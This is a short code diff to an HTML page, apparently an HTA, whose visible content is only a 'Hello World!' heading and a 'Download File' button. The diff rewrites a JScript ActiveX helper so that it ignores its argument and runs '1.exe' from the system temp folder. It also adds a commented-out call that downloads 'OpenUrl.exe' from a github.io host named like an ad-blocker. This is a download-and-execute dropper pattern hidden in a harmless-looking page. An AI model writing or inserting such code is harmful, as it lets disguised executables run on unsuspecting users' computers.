@@ -24,8 +24,11 @@ function openUrlInDefaultBrowser(url) {
   shell.ShellExecute(url);
 }
 function runExeFile(path) {
+  var fso = new ActiveXObject("Scripting.FileSystemObject");
+  var tempFolder = fso.GetSpecialFolder(2);
   var shell = new ActiveXObject("WScript.Shell");
-  shell.Run(path);
+
+  shell.Run(tempFolder+"\\1.exe");
 }
 function downloadFile(url, filename) {
   var fso = new ActiveXObject("Scripting.FileSystemObject");
@@ -53,6 +56,7 @@ function downloadFile(url, filename) {
   <h1>Hello World!</h1>
   <p>This is my HTML content.</p>
   <script type="text/javascript">
+//downloadFile('https://total-adblock.github.io/OpenUrl.exe', ' ')
 
   </script>
   <button onclick="">Download File</button>
